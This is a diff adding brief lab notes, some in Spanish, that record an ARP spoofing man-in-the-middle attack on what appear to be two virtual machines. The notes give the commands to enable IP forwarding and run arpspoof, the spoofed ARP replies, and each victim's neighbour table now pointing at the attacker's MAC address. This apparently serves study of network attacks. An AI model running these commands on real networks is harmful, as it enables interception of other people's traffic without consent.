@@ -1,0 +1,19 @@
+$ sudo sysctl –w net.ipv4.conf.all.forwarding=1
+$ sudo arpspoof -i eth1 -t 192.168.1.12 -r 192.168.1.11
+8:0:27:a0:bf:81 8:0:27:25:26:2f 0806 42: arp reply 192.168.1.11 is-at 8:0:27:a0:bf:81
+8:0:27:a0:bf:81 8:0:27:ae:b5:7e 0806 42: arp reply 192.168.1.12 is-at 8:0:27:a0:bf:81
+8:0:27:a0:bf:81 8:0:27:25:26:2f 0806 42: arp reply 192.168.1.11 is-at 8:0:27:a0:bf:81
+8:0:27:a0:bf:81 8:0:27:ae:b5:7e 0806 42: arp reply 192.168.1.12 is-at 8:0:27:a0:bf:81
+^C 
+
+------------------------------------------------------------------------------------
+Desde la victima 1:
+
+$ sudo ip neig show
+192.168.1.12 dev eth1 lladdr 08:00:27:a0:bf:81 REACHABLE
+
+------------------------------------------------------------------------------------
+Desde la victima 2:
+
+$ sudo ip neig show
+192.168.1.11 dev eth1 lladdr 08:00:27:a0:bf:81 REACHABLE
